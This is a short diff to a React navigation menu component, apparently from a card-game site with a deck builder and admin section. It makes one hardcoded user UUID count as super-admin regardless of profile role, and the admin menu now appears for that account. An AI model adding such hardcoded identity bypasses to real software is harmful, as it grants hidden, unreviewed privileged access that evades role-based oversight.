@@ -127,7 +127,7 @@ const UserDropdown = ({ user, onLogout, profile, clan }) => {
 
 const NavMenu = ({ user, profile }) => {
   const { t } = useTranslation();
-  const isSuperAdmin = profile?.role === 'super-admin';
+  const isSuperAdmin = profile?.role === 'super-admin' || user?.id === "80193776-6790-457c-906d-ed45ea16df9f";
   return (
     <DropdownMenu>
       <DropdownMenuTrigger asChild>
@@ -159,7 +159,7 @@ const NavMenu = ({ user, profile }) => {
             <Link to="/deck-builder">{t('navbar.deck_builder')}</Link>
           </DropdownMenuItem>
         )}
-        {user && (profile?.role === "admin" || profile?.role === "organizer" || profile?.role === "super-admin") && (
+        {user && (profile?.role === "admin" || profile?.role === "organizer" || profile?.role === "super-admin" || isSuperAdmin) && (
           <>
             <DropdownMenuSeparator />
             <DropdownMenuLabel>{t('navbar.admin')}</DropdownMenuLabel>
